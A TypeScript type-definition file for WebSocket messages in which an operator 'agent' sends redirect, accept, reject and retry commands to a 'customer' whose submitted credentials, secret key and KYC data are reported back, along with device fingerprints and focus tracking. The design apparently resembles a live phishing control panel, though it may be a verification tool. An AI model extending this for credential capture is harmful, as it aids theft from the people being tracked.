/**
 * WebSocket Message Types
 *
 * TypeScript interfaces for all WebSocket messages
 */

/**
 * Agent commands sent to customer
 */
export type AgentCommand = 'redirect' | 'accept' | 'reject' | 'retry' | 'session_ended' | 'skip' | 'navigate' | 'verification_failed' | 'verification_completed';

export interface CommandMessage {
  type: 'command';
  command: AgentCommand;
  stage?: string;
  url?: string;
  message?: string;
  next_stage?: string;
}

/**
 * Connection established
 */
export interface ConnectionEstablishedMessage {
  type: 'connection_established';
  message?: string;
}

/**
 * User status updates (sent FROM customer TO agent via WebSocket)
 */
export interface UserStatusUpdate {
  type: 'user_status_update';
  status: 'credentials_submitted' | 'secret_key_submitted' | 'kyc_submitted';
  data?: Record<string, any>;
}

/**
 * Session stage update
 */
export interface SessionUpdate {
  type: 'session_update';
  stage?: string;
  status?: 'active' | 'completed' | 'terminated' | 'rejected';
  message?: string;
}

/**
 * Device metadata for tracking
 */
export interface DeviceMetadataMessage {
  type: 'device_metadata';
  data: {
    visitorId?: string;
    userAgent?: string;
    language?: string;
    screenResolution?: string;
    timezone?: string;
    platform?: string;
  };
}

/**
 * User activity tracking (focus, blur, etc.)
 */
export interface UserActivityMessage {
  type: 'user_activity';
  activity: 'form_interaction' | 'page_focus' | 'page_blur';
  data?: Record<string, any>;
}

/**
 * Session started (with device fingerprint)
 */
export interface SessionStartedMessage {
  type: 'session_started';
  data?: Record<string, any>;
}

/**
 * Page view tracking
 */
export interface PageViewMessage {
  type: 'page_view';
  data?: {
    page?: string;
    referrer?: string;
  };
}

/**
 * Verified data from agent (after approval)
 */
export interface VerifiedDataMessage {
  type: 'verified_data';
  data?: Record<string, any>;
}

/**
 * Union of all possible messages
 */
export type WebSocketMessage =
  | CommandMessage
  | ConnectionEstablishedMessage
  | UserStatusUpdate
  | SessionUpdate
  | DeviceMetadataMessage
  | UserActivityMessage
  | SessionStartedMessage
  | PageViewMessage
  | VerifiedDataMessage;

/**
 * Infer message payload type from type field
 */
export type MessagePayloadForType<T extends string> = Extract<WebSocketMessage, { type: T }>;
